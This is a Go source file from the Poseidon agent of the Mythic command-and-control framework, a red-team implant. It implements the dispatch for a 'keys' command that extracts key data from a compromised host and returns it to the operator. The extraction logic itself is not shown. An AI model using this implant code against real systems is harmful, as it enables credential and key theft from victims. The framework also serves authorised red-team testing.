package keys

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// KeyInformation - interface for key data
type KeyInformation interface {
	KeyType() string
	Data() []byte
}

// Options - options for key data command
type Options struct {
	Command  string `json:"command"`
	Keyword  string `json:"keyword"`
	Typename string `json:"typename"`
}

// Run - extract key data
func Run(task structs.Task) {
	//Check if the types are available
	msg := task.NewResponse()
	opts := Options{}
	err := json.Unmarshal([]byte(task.Params), &opts)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	res, err := getkeydata(opts)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	msg.Completed = true
	msg.UserOutput = string(res.Data())
	task.Job.SendResponses <- msg
	return
}
